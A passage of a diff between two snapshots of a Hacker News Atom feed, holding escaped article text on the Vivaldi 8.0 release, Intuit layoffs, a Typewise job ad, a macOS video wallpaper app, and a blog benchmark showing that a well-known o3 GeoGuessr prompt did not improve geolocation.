t;p&gt;1390&lt;/p&gt;&lt;p&gt;1999&lt;/p&gt;&lt;p&gt;1754&lt;/p&gt;&lt;p&gt;702&lt;/p&gt;&lt;p&gt;2004&lt;/p&gt;&lt;p&gt;1735&lt;/p&gt;&lt;p&gt;2000&lt;/p&gt;&lt;p&gt;36&lt;/p&gt;&lt;p&gt;2000&lt;/p&gt;&lt;p&gt;4&lt;/p&gt;&lt;p&gt;9&lt;/p&gt;&lt;p&gt;3&lt;/p&gt;&lt;p&gt;6&lt;/p&gt;&lt;p&gt;11&lt;/p&gt;&lt;p&gt;1&lt;/p&gt;&lt;p&gt;28567&lt;/p&gt;&lt;p&gt;2002&lt;/p&gt;&lt;p&gt;1988&lt;/p&gt;&lt;p&gt;133&lt;/p&gt;&lt;p&gt;2025&lt;/p&gt;&lt;p&gt;14&lt;/p&gt;&lt;p&gt;33&lt;/p&gt;&lt;p&gt;17&lt;/p&gt;&lt;p&gt;6&lt;/p&gt;&lt;p&gt;10&lt;/p&gt;&lt;p&gt;7&lt;/p&gt;&lt;p&gt;26&lt;/p&gt;&lt;p&gt;1992&lt;/p&gt;&lt;p&gt;189&lt;/p&gt;&lt;p&gt;1994&lt;/p&gt;&lt;p&gt;35&lt;/p&gt;&lt;p&gt;1992&lt;/p&gt;&lt;p&gt;22&lt;/p&gt;&lt;p&gt;1990&lt;/p&gt;&lt;p&gt;173&lt;/p&gt;&lt;p&gt;1990&lt;/p&gt;&lt;p&gt;87&lt;/p&gt;&lt;p&gt;1993&lt;/p&gt;&lt;p&gt;27&lt;/p&gt;&lt;p&gt;1991&lt;/p&gt;&lt;p&gt;30&lt;/p&gt;&lt;p&gt;1993&lt;/p&gt;&lt;p&gt;224&lt;/p&gt;&lt;p&gt;1991&lt;/p&gt;&lt;p&gt;6&lt;/p&gt;&lt;p&gt;1995&lt;/p&gt;&lt;p&gt;63&lt;/p&gt;&lt;p&gt;1992&lt;/p&gt;&lt;p&gt;362&lt;/p&gt;&lt;p&gt;57&lt;/p&gt;&lt;p&gt;230&lt;/p&gt;&lt;p&gt;1995&lt;/p&gt;&lt;p&gt;119&lt;/p&gt;&lt;p&gt;1995&lt;/p&gt;&lt;p&gt;23&lt;/p&gt;&lt;p&gt;1989&lt;/p&gt;&lt;p&gt;105&lt;/p&gt;&lt;p&gt;1993&lt;/p&gt;&lt;p&gt;81&lt;/p&gt;&lt;p&gt;1994&lt;/p&gt;&lt;p&gt;152&lt;/p&gt;&lt;p&gt;1996&lt;/p&gt;&lt;p&gt;702&lt;/p&gt;&lt;p&gt;2004&lt;/p&gt;&lt;p&gt;1859&lt;/p&gt;&lt;p&gt;1997&lt;/p&gt;&lt;p&gt;46&lt;/p&gt;&lt;p&gt;1993&lt;/p&gt;&lt;p&gt;7&lt;/p&gt;&lt;p&gt;1990&lt;/p&gt;&lt;p&gt;24&lt;/p&gt;&lt;p&gt;1986&lt;/p&gt;&lt;p&gt;6&lt;/p&gt;&lt;p&gt;1989&lt;/p&gt;&lt;p&gt;28&lt;/p&gt;&lt;p&gt;1988&lt;/p&gt;&lt;p&gt;16&lt;/p&gt;&lt;p&gt;1994&lt;/p&gt;&lt;p&gt;Enjoy classic games completely free and without ads on dos.zone! Support us to keep these ad-free, timeless experiences open for everyone. Join the mission today!&lt;/p&gt;&lt;p&gt;Cloud Tips&lt;/p&gt;&lt;p&gt;@caiiiycuk&lt;/p&gt;&lt;p&gt;BTC&lt;/p&gt;&lt;p&gt;1EngssY81sziuQyb9JGXURG3WDajyC8kW6&lt;/p&gt;&lt;p&gt;ETH&lt;/p&gt;&lt;p&gt;0x54FEBE29Cd700f88468032b33c33CdcD7c7cCa53&lt;/p&gt;&lt;/main&gt;
   &lt;comments/&gt;
-&lt;/doc&gt;</content><link href="https://dos.zone/"/><published>2026-05-20T22:53:27+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48215979</id><title>Show HN: I reverse engineered Apple's video wallpapers</title><updated>2026-05-21T06:31:54.595541+00:00</updated><content>&lt;doc fingerprint="a4143286671195e0"&gt;
+&lt;/doc&gt;</content><link href="https://dos.zone/"/><published>2026-05-20T22:53:27+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48215979</id><title>Show HN: I reverse engineered Apple's video wallpapers</title><updated>2026-05-21T10:28:33.399657+00:00</updated><content>&lt;doc fingerprint="a4143286671195e0"&gt;
   &lt;main&gt;
     &lt;p&gt;A video wallpaper engine for macOS Tahoe.&lt;/p&gt;
     &lt;p&gt;Phosphene is a menu bar app + wallpaper extension that plays your own video files as the macOS desktop and lock-screen wallpaper. It plugs into the system's native wallpaper picker, so videos appear alongside Apple's built-in Aerials in System Settings → Wallpaper.&lt;/p&gt;
@@ -657,7 +496,7 @@ open Phosphene.xcodeproj&lt;/code&gt;
     &lt;p&gt;Built by @kageroumado. Phosphene was originally a commercial project; it's open-source now because the market for "video wallpaper apps on macOS" turned out to be more crowded than it looked.&lt;/p&gt;
   &lt;/main&gt;
   &lt;comments/&gt;
-&lt;/doc&gt;</content><link href="https://github.com/kageroumado/phosphene"/><published>2026-05-20T23:54:06+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48216016</id><title>The Letter S, by Donald Knuth (1980) [pdf]</title><updated>2026-05-21T06:31:54.425118+00:00</updated><content/><link href="https://gwern.net/doc/design/typography/1980-knuth.pdf"/><published>2026-05-20T23:58:51+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48216278</id><title>Intuit to lay off over 3k employees to refocus on AI</title><updated>2026-05-21T06:31:54.338179+00:00</updated><content>&lt;doc fingerprint="29500d5f0efe994c"&gt;
+&lt;/doc&gt;</content><link href="https://github.com/kageroumado/phosphene"/><published>2026-05-20T23:54:06+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48216016</id><title>The Letter S, by Donald Knuth (1980) [pdf]</title><updated>2026-05-21T10:28:33.219529+00:00</updated><content/><link href="https://gwern.net/doc/design/typography/1980-knuth.pdf"/><published>2026-05-20T23:58:51+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48216278</id><title>Intuit to lay off over 3k employees to refocus on AI</title><updated>2026-05-21T10:28:33.113633+00:00</updated><content>&lt;doc fingerprint="29500d5f0efe994c"&gt;
   &lt;main&gt;
     &lt;p&gt;Enterprise software giant Intuit is letting 17% of its staff go, or about 3,000 people, as it seeks to divert resources toward baking AI into its products, Reuters reported, citing an internal memo sent to employees.&lt;/p&gt;
     &lt;p&gt;The memo by CEO Sasan Goodarzi said the layoffs are meant to reduce complexity by simplifying the company’s corporate structure and help it focus on AI efforts, according to Reuters.&lt;/p&gt;
@@ -671,7 +510,7 @@ open Phosphene.xcodeproj&lt;/code&gt;
     &lt;p&gt;The company expects revenue to increase by about 10% in the third quarter, for which it will report results later today.&lt;/p&gt;
   &lt;/main&gt;
   &lt;comments/&gt;
-&lt;/doc&gt;</content><link href="https://techcrunch.com/2026/05/20/intuit-to-lay-off-over-3000-employees-to-refocus-on-ai/"/><published>2026-05-21T00:36:01+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48216983</id><title>Haskell Foundation 2026 Update</title><updated>2026-05-21T06:31:53.918003+00:00</updated><content>&lt;doc fingerprint="628eb0ff4aa2ae77"&gt;
+&lt;/doc&gt;</content><link href="https://techcrunch.com/2026/05/20/intuit-to-lay-off-over-3000-employees-to-refocus-on-ai/"/><published>2026-05-21T00:36:01+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48216619</id><title>What is a Demand Coop</title><updated>2026-05-21T10:28:32.702298+00:00</updated><link href="https://cahootzcoops.com/blog/what-is-a-demand-coop"/><published>2026-05-21T01:20:52+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48216983</id><title>Haskell Foundation 2026 Update</title><updated>2026-05-21T10:28:32.213535+00:00</updated><content>&lt;doc fingerprint="628eb0ff4aa2ae77"&gt;
   &lt;main&gt;
     &lt;div&gt;
       &lt;p&gt;The Haskell Foundation has been at the center of a flurry of changes, all of which I’d like to share with the community today.&lt;/p&gt;
@@ -687,21 +526,442 @@ open Phosphene.xcodeproj&lt;/code&gt;
     &lt;/div&gt;
   &lt;/main&gt;
   &lt;comments/&gt;
-&lt;/doc&gt;</content><link href="https://discourse.haskell.org/t/haskell-foundation-2026-update/14136"/><published>2026-05-21T02:13:23+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48217052</id><title>OpenAI to confidentially file for IPO as soon as Friday</title><updated>2026-05-21T06:31:53.719843+00:00</updated><content>&lt;doc fingerprint="a2258ddd90b6b7e0"&gt;
+&lt;/doc&gt;</content><link href="https://discourse.haskell.org/t/haskell-foundation-2026-update/14136"/><published>2026-05-21T02:13:23+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48219060</id><title>Vivaldi 8.0</title><updated>2026-05-21T10:28:31.582110+00:00</updated><content>&lt;doc fingerprint="9e6403071b7788bd"&gt;
   &lt;main&gt;
-    &lt;p&gt;OpenAI is preparing to confidentially file a draft of its IPO prospectus as soon as Friday, as the company gears up for what could be one of the largest public markets debuts in history, CNBC confirmed on Wednesday.&lt;/p&gt;
-    &lt;p&gt;The artificial intelligence company, which is valued at more than $850 billion by private investors, is working with banks including Goldman Sachs and Morgan Stanley to prepare to file in the coming days or weeks, according to a source familiar with the matter who asked not to be named because the details are confidential.&lt;/p&gt;
-    &lt;p&gt;"As part of normal governance, we regularly evaluate a range of strategic options," An OpenAI representative said in a statement. "Our focus remains on execution."&lt;/p&gt;
-    &lt;p&gt;OpenAI has been preparing to IPO as soon as the fourth quarter of this year, as CNBC previously reported. OpenAI CFO Sarah Friar told CNBC last month that it is "good hygiene" for a company of OpenAI's size to "look and feel and act" like a public company, but she wouldn't comment on a specific timeline.&lt;/p&gt;
-    &lt;p&gt;Goldman Sachs and Morgan Stanley did not comment. The Wall Street Journal was first to report the confidential filing.&lt;/p&gt;
-    &lt;p&gt;OpenAI's preparations land as Elon Musk's competitor SpaceX, which merged with xAI earlier this year, is set to publicly disclose its IPO prospectus as soon as Wednesday. Goldman Sachs will have the lead left position on the SpaceX prospectus, followed by Morgan Stanley, and then Bank of America, Citigroup and JPMorgan Chase, sources told CNBC.&lt;/p&gt;
-    &lt;p&gt;SpaceX's offering is expected to bring in a record-breaking sum after it was most recently valued at $1.25 trillion in February. It confidentially filed with the Securities and Exchange Commission last month.&lt;/p&gt;
-    &lt;p&gt;Musk and OpenAI CEO Sam Altman are taking their bitter rivalry to Wall Street after the former friends and co-founders spent much of the last month facing off in federal court in Oakland, California. Musk sued OpenAI, Altman and Greg Brockman, the company's president, alleging they went back on their vow to keep the company a nonprofit.&lt;/p&gt;
-    &lt;p&gt;On Monday, an advisory jury said that Musk waited too long to sue, a verdict that was immediately adopted by Judge Yvonne Gonzalez Rogers. Musk called the decision a "calendar technicality" in a post on his social network X.&lt;/p&gt;
-    &lt;p&gt;OpenAI kickstarted the AI boom with the launch of its ChatGPT chatbot in 2022, and it's ballooned into one of the most valuable private companies in the world since then.&lt;/p&gt;
-    &lt;p&gt;The company has raised more than $180 billion from investors, and it continues to burn through cash at a historic pace. As Altman pushes toward an IPO, he's under pressure from investors to show that the numbers work, while facing increasingly stiff competition from rivals, most notably Anthropic, which is winning in the enterprise and the AI coding market.&lt;/p&gt;
-    &lt;p&gt;Anthropic is currently in talks with investors to raise money at a $900 billion valuation, which would push it ahead of OpenAI. The company said in April that it's topped $30 billion in annualized revenue.&lt;/p&gt;
-    &lt;p&gt;WATCH: ‘Theater is now done,’ time for AI company growth and substance: Deepwater’s Munster&lt;/p&gt;
+    &lt;p&gt;&lt;lb/&gt;More than thirteen years in, and I am still as excited about building this browser as I was on day one. Maybe more.&lt;/p&gt;
+    &lt;p&gt;That excitement comes from a genuine belief that the people who use Vivaldi deserve a browser that takes them seriously. We respect your time, your privacy, your preferences, your intelligence. Every release we ship is another expression of that belief.&lt;/p&gt;
+    &lt;p&gt;Vivaldi 8.0 is the biggest expression of that idea we have shipped in years. A new design direction that makes the browser feel more alive and more unified than any version before it.&lt;lb/&gt;In other words: there is more control, more capability, more choice. And a brand new look.&lt;/p&gt;
+    &lt;head rend="h3"&gt;A new look for a new era&lt;/head&gt;
+    &lt;p&gt;With 8.0, Vivaldi has a new look. We call it “Unified”.&lt;/p&gt;
+    &lt;p&gt;We have approached the Vivaldi interface less as a collection of components, and more as a layered system. Previously, those layers (tabs, toolbars, panels and content) have had subtle separations. This was useful, but also a bit fragmented. With Unified, those boundaries are removed.&lt;/p&gt;
+    &lt;p&gt;All toolbars now live on a single, continuous surface: a Unified frame that wraps the entire browser. Instead of stacked regions, everything is composed within the same visual plane. That shift makes the interface feel more cohesive and easier to read. Alignment becomes more precise, spacing more intentional, and interaction more direct, because elements no longer sit in isolated layers.&lt;/p&gt;
+    &lt;p&gt;When you pick a theme, it flows through everything. A dark theme is dark, all the way through. A warm theme carries that warmth into every corner. All elements of the browser belong together in a way that immediately feels… well … Unified.&lt;lb/&gt;It also changes how themes work.&lt;/p&gt;
+    &lt;p&gt;With a single surface, your theme can flow across the entire window. Backgrounds are no longer confined; they can extend from the tab bar through panels and edges without interruption. Wallpapers feel less like decoration and more like part of the environment, especially when combined with translucency and blur. From a system perspective, this reduces complexity. Fewer layers, fewer exceptions and a more consistent foundation to build on.&lt;/p&gt;
+    &lt;p&gt;This isn’t about making the browser look simpler. It’s about making the structure behind it more coherent. This makes everything you see feel like part of the same system.&lt;/p&gt;
+    &lt;p&gt;You can see the new UI’s possibilities with our new default themes, such as Zen, Soria Moria, Sunset Forest and Kawaii Clouds, and our updated light and dark themes. If you can’t find something that hits the right spot for default, there are more than 7000 to choose from at themes.vivaldi.net. And if you have built a custom theme you love, you’re free to decide if you want the new look, or keep your own (Settings →Themes → Editor → Coloring mode). Of course; this is Vivaldi.&lt;/p&gt;
+    &lt;head rend="h3"&gt;Start exactly where you need to be&lt;/head&gt;
+    &lt;p&gt;One of the things that makes Vivaldi special is also one of the things that can feel like a lot on day one: the sheer range of settings you can configure. If you have been using Vivaldi for years, you have your setup exactly as you want it and you would not trade it for anything. If you are brand new, figuring out where to start can be a real question.&lt;/p&gt;
+    &lt;p&gt;Vivaldi 8.0 answers it with six preset layouts, available right from onboarding (and from Settings → Appearance → Layout whenever you feel like a change). Each one is a thoughtfully curated starting point.&lt;/p&gt;
+    &lt;list rend="ul"&gt;
+      &lt;item&gt;Simple gives you a clean, focused experience: tabs on top, nothing in the way, everything ready to go. It is Vivaldi in its purest form and it is already more capable than anything the mainstream browsers will offer.&lt;/item&gt;
+    &lt;/list&gt;
+    &lt;list rend="ul"&gt;
+      &lt;item&gt;Classic is the Vivaldi you know and love. Toolbar, panels, all the controls in their natural places, now wearing the new Unified look. This is home for a lot of you, and it is as good as it has ever been.&lt;/item&gt;
+    &lt;/list&gt;
+    &lt;list rend="ul"&gt;
+      &lt;item&gt;Vertical Right is similar to our classic look, but for people who prefer to have their tabs on the right. You’ll find the URL field on top, and panels on the left, as usual.&lt;/item&gt;
+    &lt;/list&gt;
+    &lt;list rend="ul"&gt;
+      &lt;item&gt;Vertical Left puts your tabs and address bar on the left side of the screen. Once you try this on a wide monitor, it tends to become permanent. It uses your horizontal screen space in ways that a top tab bar simply cannot. With Panels available on hover from the right side of your screen, it changes how browsing feels.&lt;/item&gt;
+    &lt;/list&gt;
+    &lt;list rend="ul"&gt;
+      &lt;item&gt;Auto Hide is built for users who want the web to fill their entire screen. Your toolbar, tab bar, panel, and address bar step aside while you read, watch, or work, and reappear the moment your cursor reaches for any edge of the screen. It is edge to edge content with full Vivaldi capability sitting right behind it, and it is a way of experiencing the web that the other browsers have not figured out.&lt;/item&gt;
+    &lt;/list&gt;
+    &lt;list rend="ul"&gt;
+      &lt;item&gt;Bottom moves your tab bar and address bar to the bottom of the screen. Your eye travels down naturally as you read, and your navigation is already there waiting. More people work this way than you might expect, and Vivaldi has always been happy to accommodate them.&lt;/item&gt;
+    &lt;/list&gt;
+    &lt;p&gt;Click on each of the layouts to make them bigger:&lt;/p&gt;
+    &lt;p&gt;Each of these layouts is a launchpad, not a limit. With all the powerful features and tools in Vivaldi, you have everything you need to make the web work exactly the way you want it to.&lt;/p&gt;
+    &lt;p&gt;Vivaldi has a tab management system unlike any other browser. Tile as many pages as you want, just how you want. Use Follower Tab to explore links from an article without ever losing your place in it. Stack your tabs into named, colour-coded groups. Use the Tab Button to search everything at once: open tabs, synced tabs from your other devices, recently closed tabs. Your mail, your calendar, your notes, your reading list: all of it lives inside Vivaldi, organised on your terms, always within reach.&lt;/p&gt;
+    &lt;p&gt;Vivaldi is truly the browser that adapts to you. We’ve proven this with every release. We even go as far as getting completely out of your way. With UI Auto-hide, even the interface itself knows when to let the content take centre stage. Vivaldi bends to how you work. It always has and always will.&lt;/p&gt;
+    &lt;head rend="h3"&gt;This is Vivaldi. It always has been.&lt;/head&gt;
+    &lt;p&gt;We do not answer to investors telling us which features to build. We do not track your behaviour or treat your data as inventory. Other browsers are adding AI to decide what you see. Vivaldi adds tools that give you more power when deciding for yourself. That has always been the difference. We build Vivaldi because we believe you deserve a better browser.&lt;/p&gt;
+    &lt;p&gt;Download it today. Take your time with it. Come find us in the Forum if there is anything, we read everything.&lt;/p&gt;
+    &lt;p&gt;As always, thank you for being part of the Vivaldi community. Together, we’re fighting for a better web, one release at a time.&lt;/p&gt;
+    &lt;p&gt;***&lt;/p&gt;
+    &lt;head rend="h3"&gt;Changelog&lt;/head&gt;
+    &lt;p&gt;Check the changelog with the full list of changes from Vivaldi 7.9 to 8.0.&lt;/p&gt;
   &lt;/main&gt;
   &lt;comments/&gt;
-&lt;/doc&gt;</content><link href="https://www.cnbc.com/2026/05/20/openai-ipo-filing.html"/><published>2026-05-21T02:24:35+00:00</published></entry></feed>
+&lt;/doc&gt;</content><link href="https://vivaldi.com/blog/vivaldi-on-desktop-8-0/"/><published>2026-05-21T07:21:55+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48219340</id><title>Typewise (YC S22) Is Hiring an AI Growth Engineer (Zurich or Remote)</title><updated>2026-05-21T10:28:31.110740+00:00</updated><content>&lt;doc fingerprint="314ce3597b5ca3a5"&gt;
+  &lt;main&gt;
+    &lt;p&gt;Boosting customer service and sales productivity by 2-3x.&lt;/p&gt;
+    &lt;p&gt;Customer service is being rebuilt from scratch, and we’re building the platform that wins it.&lt;/p&gt;
+    &lt;p&gt;Typewise (YC S22) is the AI Agent Platform behind 60+ enterprise customer service teams across Europe and the US. Brands like Unilever and DPD use us to resolve customer requests across email, chat, and social, autonomously, at a fraction of the cost and a multiple of the quality. We’re a 20-person remote-first team out of Zurich, moving fast, and we just raised the round to push harder.&lt;/p&gt;
+    &lt;p&gt;Here’s the challenge: when a CS leader sits down today and types “best AI customer service platform” into Google, they find Fin/Intercom. They find Zendesk. They don’t find us. Yet.&lt;/p&gt;
+    &lt;p&gt;That’s the job.&lt;/p&gt;
+    &lt;p&gt;You’ll report directly to David (CEO, ex-Booz Allen strategy) and work alongside Janis (CTO, deep tech NLP). No marketing VP layer. No approval chains. Two founders who’ve built the company from a research project to 50+ enterprise customers and who now need someone to make the world find what they’ve built. You’ll have direct access to decisions, budget, and the full team.&lt;/p&gt;
+    &lt;p&gt;As AI Growth Engineer, you own one outcome: make CS buyers find Typewise through any creative, non-paid, AI-powered means that work. No channel is off-limits. No approach is too unconventional. You pick the channels, build the systems, run the experiments, and iterate ruthlessly. This is a 3-month sprint to prove what works with the option to extend or convert to full-time.&lt;/p&gt;
+    &lt;p&gt;In your first 30 days, you'll have shipped your first experiments and generated your first measurable signals. We don't care which channel. We care that something is live and learning.&lt;/p&gt;
+    &lt;p&gt;Don't send us a CV. Send us something you've built: a bot, an automation, a growth system, a content engine. Show us how you think and what you can ship. Tell us which channels you'd attack first for Typewise and why.&lt;/p&gt;
+    &lt;p&gt;Help us make sure the next person searching for a CS AI solution finds Typewise, not just the incumbents.&lt;/p&gt;
+    &lt;p&gt;Typewise (Y Combinator S22) is a Swiss-American deep tech company, on a mission to make daily lives easier by decoding human thoughts. We build text prediction software for enterprises. Our Fortune 500 clients use Typewise to communicate faster and more effectively. Our technology is co-developed with top researchers from ETH Zurich AI Center.&lt;/p&gt;
+  &lt;/main&gt;
+  &lt;comments/&gt;
+&lt;/doc&gt;</content><link href="https://www.ycombinator.com/companies/typewise/jobs/HmCzfBK-ai-growth-engineer"/><published>2026-05-21T08:01:53+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48219682</id><title>The famous O3 "GeoGuessr" prompt did not work</title><updated>2026-05-21T10:28:30.948517+00:00</updated><content>&lt;doc fingerprint="2d0f9f1e3be64c8d"&gt;
+  &lt;main&gt;
+    &lt;head rend="h1"&gt;The famous o3 "GeoGuessr" prompt did not work&lt;/head&gt;
+    &lt;p&gt;In April last year, Kelsey Piper discovered that OpenAI’s o3 model was surprisingly good at figuring out where a photo was taken from. Like human “geoguessr” pros, o3 could sometimes take a nondescript photo of a beach and tell you exactly where it is. Here’s the example Kelsey gave:&lt;/p&gt;
+    &lt;p&gt;Several people reproduced this with good results: not a 100% success rate, but clearly far better than you’d do with a random human guess. The lesson here is that model capabilities can surprise us. The o3 model had been released for two weeks before Kelsey’s tweet without anyone noticing how good it was at geolocation. What obscure capabilities did we never find? What capabilities of current models are we missing today?&lt;/p&gt;
+    &lt;p&gt;Some people drew another lesson from this: that “prompt engineering” can unlock brand-new capabilities. This is because Kelsey had a magic prompt that she built over time. When o3 got something wrong, she would ask it how it could have avoided the mistake, and then included that in the prompt. Here’s the first 10% of that prompt, so you get the idea:&lt;/p&gt;
+    &lt;quote&gt;
+      &lt;p&gt;You are playing a one-round game of GeoGuessr. Your task: from a single still image, infer the most likely real-world location. Note that unlike in the GeoGuessr game, there is no guarantee that these images are taken somewhere Google’s Streetview car can reach: they are user submissions to test your image-finding savvy. Private land, someone’s backyard, or an offroad adventure are all real possibilities (though many images are findable on streetview). Be aware of your own strengths and weaknesses: following this protocol, you usually nail the continent and country…&lt;/p&gt;
+    &lt;/quote&gt;
+    &lt;p&gt;This prompt impressed a lot of people, who tried it out and reported that it correctly identified a lot of images. But of course, o3 correctly identified a lot of images with just a basic “think carefully about where this picture was taken?” prompt. Did the prompt actually help? It’d be tough to figure that out just from playing around in ChatGPT. You’d need to build an evaluation set of images and run o3 against them twice: once with the fancy prompt and once without it.&lt;/p&gt;
+    &lt;p&gt;So that’s what I did. I pulled 200 images from Wikimedia Commons, Geograph Britain and Ireland, and iNaturalist for the benchmark. You can read the AI-generated summary here, but here’s the key table:&lt;/p&gt;
+    &lt;table&gt;
+      &lt;row span="10"&gt;
+        &lt;cell role="head"&gt;Prompt&lt;/cell&gt;
+        &lt;cell role="head"&gt;n&lt;/cell&gt;
+        &lt;cell role="head"&gt;Median km&lt;/cell&gt;
+        &lt;cell role="head"&gt;Mean km&lt;/cell&gt;
+        &lt;cell role="head"&gt;P25 km&lt;/cell&gt;
+        &lt;cell role="head"&gt;P75 km&lt;/cell&gt;
+        &lt;cell role="head"&gt;&amp;lt;=25 km&lt;/cell&gt;
+        &lt;cell role="head"&gt;&amp;lt;=100 km&lt;/cell&gt;
+        &lt;cell role="head"&gt;&amp;lt;=500 km&lt;/cell&gt;
+        &lt;cell role="head"&gt;&amp;lt;=1000 km&lt;/cell&gt;
+      &lt;/row&gt;
+      &lt;row span="10"&gt;
+        &lt;cell&gt;Default&lt;/cell&gt;
+        &lt;cell&gt;200&lt;/cell&gt;
+        &lt;cell&gt;83.2&lt;/cell&gt;
+        &lt;cell&gt;440.7&lt;/cell&gt;
+        &lt;cell&gt;16.4&lt;/cell&gt;
+        &lt;cell&gt;221.9&lt;/cell&gt;
+        &lt;cell&gt;58&lt;/cell&gt;
+        &lt;cell&gt;109&lt;/cell&gt;
+        &lt;cell&gt;176&lt;/cell&gt;
+        &lt;cell&gt;182&lt;/cell&gt;
+      &lt;/row&gt;
+      &lt;row&gt;
+        &lt;cell&gt;GeoGuessr prompt&lt;/cell&gt;
+        &lt;cell&gt;200&lt;/cell&gt;
+        &lt;cell&gt;102.3&lt;/cell&gt;
+        &lt;cell&gt;481.9&lt;/cell&gt;
+        &lt;cell&gt;18.5&lt;/cell&gt;
+        &lt;cell&gt;277.8&lt;/cell&gt;
+        &lt;cell&gt;59&lt;/cell&gt;
+        &lt;cell&gt;99&lt;/cell&gt;
+        &lt;cell&gt;172&lt;/cell&gt;
+        &lt;cell&gt;180&lt;/cell&gt;
+      &lt;/row&gt;
+    &lt;/table&gt;
+    &lt;p&gt;In general, the basic prompt did better on average. It consistently guessed closer to the actual location. Both prompts did pretty well, actually. Despite the fancy prompt being 10x larger, it only caused o3 to think for slightly longer (about one second on average, though the max was about double, at 10 minutes instead of 5 minutes). The images in my benchmark were fairly generic geoguessr-style outdoor images, with twelve indoor images thrown in for an extra challenge (the fancy prompt also did slightly worse on these).&lt;/p&gt;
+    &lt;p&gt;What’s going on? I think this shows how easy it is to fool yourself about the quality of prompting. When the model is already pretty good at a task, you can give it a very elaborate prompt without impacting performance. It’ll still be pretty good, except this time it’s good because of what you did. This is particularly true if you’re iterating with the model and asking it “what should I add to the prompt” for each mistake. Models will happily make up stories for you about their own reasoning processes, and will almost always say “yes, that helped a lot!” when you ask them if a particular prompt tweak made things better. The only way to actually know is by constructing some kind of benchmark1.&lt;/p&gt;
+    &lt;p&gt;It’s also interesting to me that nobody checked this at the time. It took me about six hours of fairly-distracted work and about $15 to construct and run this benchmark. Why didn’t anyone do this when they were writing articles about how good the o3 prompt was?&lt;/p&gt;
+    &lt;p&gt;One charitable reason might be that the story was more about o3’s real geolocation ability than about the magic prompt. The pricing for o3 also used to be about five times more expensive (though a benchmark of 40 images instead of 200 would still have thrown doubt on how much water the prompt was carrying). Also, AI just moves so fast. Geolocation was only the story for about a week: after that, GPT-4o’s sycophancy was what people were talking about. Another reason is that AI tooling wasn’t as good then. The benchmark was so easy for me to run because GPT-5.5 did most of the heavy lifting. Prior to strong agents, you would have had to write the (simple) benchmark yourself. I can’t point the finger too hard: I didn’t bother at the time either.&lt;/p&gt;
+    &lt;p&gt;Maybe my benchmark isn’t very good? The photos look reasonable enough: a wide variety of geoguessr-like shots of roads and landscapes, mostly. I could have tried to gather a few thousand photos instead of a few hundred, but if the magic prompt really was a big improvement you’d still expect to see that manifest on a benchmark this size. If someone wants to go and build a hundred-dollar geolocation benchmark instead of my fifteen-dollar one, I think that’d be an interesting project.&lt;/p&gt;
+    &lt;p&gt;Finally, let’s use the benchmark to answer a question I’ve had for a while: do gpt-5.4 and gpt-5.5 have o3’s geolocation abilities? The answer, apparently, is no.&lt;/p&gt;
+    &lt;table&gt;
+      &lt;row span="6"&gt;
+        &lt;cell role="head"&gt;Run&lt;/cell&gt;
+        &lt;cell role="head"&gt;Median km&lt;/cell&gt;
+        &lt;cell role="head"&gt;Mean km&lt;/cell&gt;
+        &lt;cell role="head"&gt;&amp;lt;=25 km&lt;/cell&gt;
+        &lt;cell role="head"&gt;&amp;lt;=100 km&lt;/cell&gt;
+        &lt;cell role="head"&gt;&amp;lt;=500 km&lt;/cell&gt;
+      &lt;/row&gt;
+      &lt;row span="6"&gt;
+        &lt;cell&gt;o3 default&lt;/cell&gt;
+        &lt;cell&gt;83.2&lt;/cell&gt;
+        &lt;cell&gt;440.7&lt;/cell&gt;
+        &lt;cell&gt;58&lt;/cell&gt;
+        &lt;cell&gt;109&lt;/cell&gt;
+        &lt;cell&gt;176&lt;/cell&gt;
+      &lt;/row&gt;
+      &lt;row span="6"&gt;
+        &lt;cell&gt;o3 GeoGuessr&lt;/cell&gt;
+        &lt;cell&gt;102.3&lt;/cell&gt;
+        &lt;cell&gt;481.9&lt;/cell&gt;
+        &lt;cell&gt;59&lt;/cell&gt;
+        &lt;cell&gt;99&lt;/cell&gt;
+        &lt;cell&gt;172&lt;/cell&gt;
+      &lt;/row&gt;
+      &lt;row span="6"&gt;
+        &lt;cell&gt;gpt-5.4 default&lt;/cell&gt;
+        &lt;cell&gt;163.3&lt;/cell&gt;
+        &lt;cell&gt;638.9&lt;/cell&gt;
+        &lt;cell&gt;26&lt;/cell&gt;
+        &lt;cell&gt;74&lt;/cell&gt;
+        &lt;cell&gt;148&lt;/cell&gt;
+      &lt;/row&gt;
+      &lt;row&gt;
+        &lt;cell&gt;gpt-5.5 default&lt;/cell&gt;
+        &lt;cell&gt;156.5&lt;/cell&gt;
+        &lt;cell&gt;645.9&lt;/cell&gt;
+        &lt;cell&gt;39&lt;/cell&gt;
+        &lt;cell&gt;77&lt;/cell&gt;
+        &lt;cell&gt;161&lt;/cell&gt;
+      &lt;/row&gt;
+    &lt;/table&gt;
+    &lt;p&gt;Whatever o3 had that made it good at this task hasn’t transferred to newer models.&lt;/p&gt;
+    &lt;list rend="ol"&gt;
+      &lt;item&gt;&lt;p&gt;Benchmarks can mislead as well, but they’re better than just vibes.&lt;/p&gt;↩&lt;/item&gt;
+    &lt;/list&gt;
+    &lt;p&gt;If you liked this post, consider subscribing to email updates about my new posts, or sharing it on Hacker News.&lt;/p&gt;
+    &lt;p&gt;Here's a preview of a related post that shares tags with this one.&lt;/p&gt;
+    &lt;quote&gt;&lt;p&gt;Prompts are technical debt too&lt;/p&gt;&lt;p&gt;It’s common and correct to say that “all code is technical debt”. Adding code is a necessary evil for developing new features: you almost always have to do it, but each line of code adds to the complexity and maintenance burden of the system. All future changes to the system have to work with the existing code, or at least avoid breaking it. Once systems accumulate enough code, they become impossible for a single person to understand: instead of reading the code and understanding what it does, you must rely on guesses, theories and heuristics. Sensible engineers write as little code as possible.&lt;/p&gt;&lt;lb/&gt;Continue reading...&lt;/quote&gt;
+  &lt;/main&gt;
+  &lt;comments/&gt;
